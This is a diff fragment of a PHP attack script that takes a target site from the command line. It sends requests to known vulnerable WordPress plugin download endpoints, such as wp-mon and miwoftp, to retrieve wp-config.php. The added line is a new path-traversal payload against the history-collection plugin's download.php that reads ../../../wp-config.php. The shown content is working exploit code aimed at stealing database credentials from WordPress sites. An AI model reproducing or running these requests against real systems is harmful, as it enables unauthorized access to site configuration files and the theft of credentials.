@@ -261,6 +261,9 @@ __request($argv[1], '/wp-content/plugins/wp-mon/assets/download.php?type=octet/s
 
 __request($argv[1], '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes');
 
+__request($argv[1], '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php');
+
+
 function __request($url, $plugin) {
 
     $objcurl = curl_init();
